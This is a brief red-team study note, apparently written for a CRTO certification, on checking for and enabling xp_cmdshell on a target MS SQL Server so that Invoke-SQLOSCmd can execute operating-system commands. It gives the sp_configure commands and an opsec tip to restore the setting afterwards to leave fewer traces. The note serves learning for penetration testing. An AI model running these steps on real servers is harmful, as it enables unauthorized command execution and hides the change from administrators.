
Run this in Heidi or mssqlclient to enable the usage of `Invoke-SQLOSCmd`


1) Enumerate the state of the xp shell:

`SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';`

2) If you get a `0` it means is disabled, you need to enable it:

```
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

3) Query again and you should get a `1`

#### ⚠ Opsec

```
If you're going to make this type of configuration change to a target, you must ensure you set it back to its original value afterwards.  
  
The reason this works with `Invoke-SQLOSCmd` is because it will automatically attempt to enable xp_cmdshell if it's not already, execute the given command, and then disable it again.  This is a good example of why you should study your tools before you use them, so you know what is happening under the hood.
```


### Properties
---
📆 created   {{21-02-2024}} 15:16
🏷️ tags: #redteam #crto 

---

